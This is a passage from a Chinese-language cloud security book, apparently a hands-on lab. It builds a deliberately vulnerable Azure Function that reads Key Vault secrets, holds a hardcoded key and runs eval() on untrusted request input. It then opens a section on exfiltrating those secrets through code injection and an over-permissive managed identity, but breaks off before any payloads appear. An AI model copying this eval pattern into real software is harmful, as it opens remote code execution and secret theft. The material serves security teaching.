  \ result: ${result} with secret ${secret00}` };\n  }\n});\n```\n\n此无服务器函数从 Azure\
  \ Key Vault 读取密钥并将它们存储在 `secrets` 对象中，以便函数在运行时可以访问它们。\n\n#### Note\n\n由于从 Azure\
  \ Key Vault 检索到的密钥只是示例占位符值，出于清晰和简洁的目的，脆弱函数的其余部分已被省略。\n\n5. 将更新后的函数代码（`evaluate.js`）部署到你的函数应用：\n\
  \n```\nfunc azure functionapp publish $FUNCTION_APP\n```\n\n6. 将函数的 Invoke URL 存储在环境变量（`INVOKE_URL`）中：\n\
  \n```\nINVOKE_URL=\"[SPECIFY INVOKE URL]\"\n```\n\n在运行命令之前，请务必将 `[SPECIFY INVOKE\
  \ URL]` 替换为函数的 Invoke URL（来自上一步的输出）。\n\n7. 获取 `evaluate` 函数的函数密钥：\n\n```\nKEY=$(az\
  \ functionapp function keys list \\\n  --resource-group $RESOURCE_GROUP \\\n  --name\
  \ $FUNCTION_APP \\\n  --function-name evaluate)\n\nFUNCTION_KEY=$(echo $KEY | jq\
  \ -r \".default\")\n```\n\n8. 使用 `curl` 通过简单表达式测试 `evaluate` 函数：\n\n```\ncurl -X\
  \ POST \"$INVOKE_URL?code=$FUNCTION_KEY\" \\\n  -H \"Content-Type: text/plain\"\
  \ \\\n  -d \"2+7\"\n```\n\n这会产生以下输出：\n\n```\nEvaluation result: 9 with secret SECRETABC123\n\
  ```\n\n现在你已确认函数可以成功从 Key Vault 读取密钥，让我们更新 `evaluate` 函数，使其不再在其输出响应中包含其中一个检索到的密钥：\n\
  \n1. 在代码编辑器中打开 `vulnerable-function/src/functions/evaluate.js`。\n\n2. 用以下代码替换 `evaluate.js`\
  \ 的内容：\n\n```\nconst { app } = require('@azure/functions');\nconst { DefaultAzureCredential\
  \ } = require(\"@azure/identity\");\nconst { SecretClient } = require(\"@azure/keyvault-secrets\"\
  );\n\nconst HARDCODED_KEY = \"67890ghijkl\";\n\nconst KEY_VAULT_NAME = process.env.KEYVAULT_NAME;\n\
  const SECRET_NAMES = [\"secret00\", \"secret01\"];\n\nconst KV_URL = `https://${KEY_VAULT_NAME}.vault.azure.net`;\n\
  \nconst credential = new DefaultAzureCredential();\nconst client = new SecretClient(KV_URL,\
  \ credential);\n\nconst secrets = {};\n(async () => {\n  for (const name of SECRET_NAMES)\
  \ {\n    try {\n      const secret = await client.getSecret(name);\n      secrets[name]\
  \ = secret.value;\n    } catch (err) {\n      console.error(`Failed to fetch secret\
  \ ${name}: ${err.message}`);\n      secrets[name] = null;\n    }\n  }\n})();\n\n\
  app.http('evaluate', {\n  methods: ['POST'],\n  authLevel: 'function',\n  handler:\
  \ async (request, context) => {\n    const expression = await request.text() ||\
  \ '\"No expression provided\"';\n\n    const { secret00, secret01 } = secrets;\n\
  \n    let result;\n\n    try {\n      result = eval(expression);\n    } catch (err)\
  \ {\n      result = `Error: ${err.message}`;\n    }\n\n    return { body: `Evaluation\
  \ result: ${result}` };\n  }\n});\n```\n\n3. 运行以下命令将更新后的函数代码（`evaluate.js`）部署到你的函数应用：\n\
  \n```\nfunc azure functionapp publish $FUNCTION_APP\n```\n\n4. 使用简单表达式，例如 `7 + 2`\
  \ 测试 `evaluate` 函数：\n\n```\ncurl -X POST \"$INVOKE_URL?code=$FUNCTION_KEY\" \\\n\
  \  -H \"Content-Type: text/plain\" \\\n  -d \"7 + 2\"\n```\n\n以下是输出：\n\n```\nEvaluation\
  \ result: 9\n```\n\n5. 使用另一个有效表达式测试 `evaluate` 函数，例如 `(7 + 2) * 5 - 3`：\n\n```\n\
  curl -X POST \"$INVOKE_URL?code=$FUNCTION_KEY\" \\\n  -H \"Content-Type: text/plain\"\
  \ \\\n  -d \"(7 + 2) * 5 - 3\"\n```\n\n这会输出以下内容：\n\n```\nEvaluation result: 42\n\
  ```\n\n在本节中，你通过设置 Key Vault 并在其中存储占位符密钥来升级无服务器实验室环境。之后，你为函数应用配置了托管标识。为了完成设置，你更新并部署了\
  \ `evaluate` 函数以安全地从 Key Vault 检索和使用密钥。\n\n此时，你的专为脆弱而设计的无服务器应用程序已准备就绪，并配置为访问和检索\
  \ Key Vault 密钥。\n\n### 利用过度宽松的托管标识来外泄 Key Vault 密钥\n\n虽然使用密钥管理器服务有助于将密钥移出代码和配置文件，但它并不能保证密钥完全免受攻击者侵害。在本节中，你将探讨过度宽松的托管标识和代码注入漏洞如何使攻击者暴露存储在\
  \ Key Vault 中的密钥。承接上一节，你将使用 `tester.rb` 脚本来执行各种代码注入负载以检索环境变量以及与函数应用关联的访问令牌，如 Figure 11-7\
  \ 所示。\n\n![](img/lsse_1107.png)\n\n\n\n\n\n由于函数应用的管理标识同时具有 Owner 级别的访问权限以及访问 Key\
  \ Vault 密钥的权限，因此你可以直接使用被窃取的访问令牌来检索密钥。在模拟过程中，你将遇到两个访问令牌：一个用于管理平面，用于修改或管理资源配置，另一个用于\
  \ Key Vault 数据平面，用于安全地访问密钥。理解这两个令牌之间的区别至关重要，因为它有助于你识别不同的访问级别以及如果被入侵的管理标识的令牌被泄露时可能产生的潜在影响。\n\
  \n#### 注意\n\n本节假定你主要使用攻击者账户进行操作。然而，部分步骤可能需要你切换到 Serverless Lab 账户，或参考保存在本地机器上的文本文件，其中包含之前复制的值。\n\
  \n让我们开始模拟：\n\n1. 从 Serverless Lab 账户的 Cloud Shell 终端复制 Invoke URL 和函数密钥的值。切换到攻击者账户的浏览器窗口和\
  \ Cloud Shell 终端，并将这些值存储在环境变量中（`INVOKE_URL` 和 `FUNCTION_KEY`）：\n\n```\nINVOKE_URL=\"\
  [SPECIFY INVOKE URL]\"\nFUNCTION_KEY=\"[SPECIFY FUNCTION KEY]\"\n```\n\n##### 提示\n\
  \n如果你的 Cloud Shell 会话已超时，只需在 Cloud Shell 弹出窗口中点击 Reconnect 按钮即可在继续操作前恢复会话。\n\n2.\
  \ 使用以下命令运行 Ruby 脚本：\n\n```\nexport INVOKE_URL=$INVOKE_URL\nexport FUNCTION_KEY=$FUNCTION_KEY\n\
  \nruby tester.rb\n```\n\n3. 在脚本的 REPL 中，在 `Enter an expression (or type 'exit' to\
